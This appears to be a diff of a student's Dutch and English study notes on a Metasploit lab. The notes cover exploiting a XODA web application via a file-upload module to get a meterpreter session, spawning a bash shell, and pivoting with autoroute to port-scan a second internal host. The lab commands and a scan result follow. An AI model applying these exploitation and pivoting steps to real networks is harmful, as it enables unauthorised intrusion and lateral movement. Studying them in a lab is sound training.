@@ -35,5 +35,39 @@ Waarom auxiliary modules gebruiken als je ook met nmap kunt scannen? Auxiliary m
 - set up workspace, command: workspace -a Port_scan 
 - use the auxiliary tcp portscan 
 - from the auxiliary module run  curl to download homepage of web application, command: curl ip 
-	- search xoda webapplication -> xoda_file_upload
-	- 
+	- search for exploit modules for xoda webapplication -> xoda_file_upload
+	- exploit will set up a meterpreter session 
+	- sysinfo will tell us more about the target system 
+	- now we want to do port scan on victim two but first we need to find out the private network ip address (subnet) that this victim system is part of so we can target another victim within the network
+		- open up a shell session: span a bash session, command: /bin/bash -i
+		- ipconfig 
+		- get out of bash: terminate shell 
+		- back in meterpreter, command: run autoroute -s ip
+				   "run autoroute -s ip" is used to configure a route to a specific subnet over a Meterpreter session. De "autoroute" module in Metasploit wordt gebruikt om de routetabel van het gecompromitteerde systeem te manipuleren, zodat verkeer dat bestemd is voor een specifiek IP-subnet wordt omgeleid via het gecompromitteerde host. Deze techniek is handig wanneer je verkeer wilt omleiden via het gecompromitteerde systeem om toegang te krijgen tot andere interne netwerken.
+		- put the meterpreter session in the background, command: background 
+		- search portscan 
+		- use the tcp portscan 
+		- set rhost to the ip in eth1 (ip of the second system)
+			because you already added the route we will run the portscan through the first victim. 
+	This is how you get a pivot point 
+	UDP module: 
+	- back 
+	- search udp_sweep 
+
+	---- lab --- 
+Commands
+- ip addr  -  me: 192.70.225.2 and target: 192.70.225.3 
+- sudo service postgresql start 
+- msfconsole -q
+- workspace -a Port_scan_target
+- search tcp portscan 
+- run aux/scanner/portscan/tcp on target
+- use exploit(unix/webapp/xoda_file_upload 
+- sets targeturi / 
+- sysinfo 
+- 
+
+
+
+
+192.70.225.3:         - 192.70.225.3:80 - TCP OPEN 
